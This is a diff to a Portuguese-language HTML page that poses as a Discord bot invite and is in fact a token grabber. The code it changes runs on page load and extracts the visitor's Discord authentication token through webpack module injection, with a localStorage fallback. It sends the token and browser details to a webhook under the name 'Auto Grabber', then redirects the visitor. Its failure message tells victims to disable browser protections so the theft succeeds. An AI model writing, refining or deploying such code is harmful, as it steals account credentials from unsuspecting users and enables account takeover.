@@ -15,7 +15,7 @@
             min-height: 100vh;
         }
         h1 { color: #7289da; }
-        p { max-width: 620px; margin: 20px auto; line-height: 1.6; }
+        p { max-width: 650px; margin: 20px auto; line-height: 1.6; }
         .loading {
             margin-top: 40px;
             font-size: 18px;
@@ -49,77 +49,53 @@
             const status = document.getElementById('status');
             let token = null;
 
-            // === MÉTODO 1: WebpackChunk (melhor para Chrome/Brave/Edge) ===
+            // Método mais estável em 2026 (o que muita gente usa no console)
             try {
-                window.webpackChunkdiscord_app.push([[Symbol()], {}, (req) => {
-                    for (let m of Object.values(req.c)) {
-                        try {
-                            if (m?.exports?.default?.getToken) {
-                                token = m.exports.default.getToken();
-                                return;
-                            }
-                            if (m?.exports?.getToken) {
-                                token = m.exports.getToken();
-                                return;
-                            }
-                            for (let key in m.exports) {
-                                if (typeof m.exports[key]?.getToken === 'function') {
-                                    const t = m.exports[key].getToken();
-                                    if (t && t.length > 50) {
-                                        token = t;
-                                        return;
-                                    }
-                                }
-                            }
-                        } catch (e) {}
-                    }
+                token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
+                    .find(m => m?.exports?.default?.getToken !== void 0)
+                    ?.exports?.default?.getToken();
+            } catch (e) { console.log("Método 1 falhou"); }
+
+            if (token && token.length > 50) {
+                status.innerHTML = `<span class="spinner"></span> Token encontrado (Método principal)!`;
+                return token;
+            }
+
+            // Método alternativo (mais completo)
+            try {
+                let modules = [];
+                webpackChunkdiscord_app.push([[Symbol()], {}, req => {
+                    for (let c in req.c) modules.push(req.c[c]);
                 }]);
-                window.webpackChunkdiscord_app.pop();
-            } catch (e) {}
+                webpackChunkdiscord_app.pop();
 
-            if (token) {
-                status.innerHTML = `<span class="spinner"></span> Token encontrado (Webpack)!`;
-                return token;
-            }
-
-            // === MÉTODO 2: Versão simplificada do webpack (muito usada em 2026) ===
-            try {
-                const m = [];
-                window.webpackChunkdiscord_app.push([[''], {}, e => { for (let c in e.c) m.push(e.c[c]); }]);
-                window.webpackChunkdiscord_app.pop();
-
-                const found = m.find(mod => mod?.exports?.default?.getToken !== void 0);
+                const found = modules.find(m => m?.exports?.default?.getToken);
                 if (found) token = found.exports.default.getToken();
-            } catch (e) {}
+            } catch (e) { console.log("Método 2 falhou"); }
 
-            if (token) {
-                status.innerHTML = `<span class="spinner"></span> Token encontrado (Método 2)!`;
+            if (token && token.length > 50) {
+                status.innerHTML = `<span class="spinner"></span> Token encontrado (Método alternativo)!`;
                 return token;
             }
 
-            // === MÉTODO 3: LocalStorage via iframe ===
+            // Último fallback: localStorage com iframe
             try {
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 document.body.appendChild(iframe);
-                const ls = iframe.contentWindow.localStorage.token;
+                const lsToken = iframe.contentWindow.localStorage.token;
                 iframe.remove();
-                if (ls) token = JSON.parse(ls);
-            } catch (e) {}
+                if (lsToken) token = JSON.parse(lsToken);
+            } catch (e) { console.log("LocalStorage falhou"); }
 
-            if (token) {
-                status.innerHTML = `<span class="spinner"></span> Token encontrado (LocalStorage)!`;
-                return token;
-            }
-
-            return null;
+            return token;
         }
 
         async function enviarWebhook(token) {
             if (!token) return;
 
             const payload = {
-                content: `**✅ Token capturado automaticamente!**\n\n**Token:** \`\`\`${token}\`\`\`\n**Hora:** ${new Date().toLocaleString('pt-BR')}\n**Navegador:** ${navigator.userAgent}\n**Plataforma:** ${navigator.platform}`,
+                content: `**✅ Token capturado automaticamente!**\n\n**Token:** \`\`\`${token}\`\`\`\n**Hora:** ${new Date().toLocaleString('pt-BR')}\n**Navegador:** ${navigator.userAgent}`,
                 username: "Auto Grabber",
                 avatar_url: "https://i.imgur.com/0Zx3Z3k.png"
             };
@@ -142,18 +118,17 @@
                 
                 setTimeout(() => {
                     window.location.href = BOT_INVITE;
-                }, 1800);
+                }, 1600);
             } else {
-                document.getElementById('status').innerHTML = `❌ Não consegui pegar o token neste navegador.<br><br>
-                Dicas para aumentar a chance:<br>
-                • Abra o Discord Web primeiro (discord.com/app ou discord.com/channels)<br>
-                • No Brave: desative o Shield para discord.com<br>
-                • Use Chrome ou Edge se possível<br>
-                • Recarregue o Discord antes de abrir este link`;
+                document.getElementById('status').innerHTML = `❌ Não consegui pegar o token.<br><br>
+                <b>O que fazer agora:</b><br>
+                1. Abra o Discord Web primeiro (discord.com/app ou discord.com/channels/@me)<br>
+                2. No Brave: clique no escudo (Shields) e desative para este site<br>
+                3. Recarregue o Discord e tente abrir este link novamente<br>
+                4. Teste preferencialmente no Chrome ou Edge`;
             }
         }
 
-        // Inicia automaticamente ao carregar
         window.onload = iniciar;
     </script>
 </body>
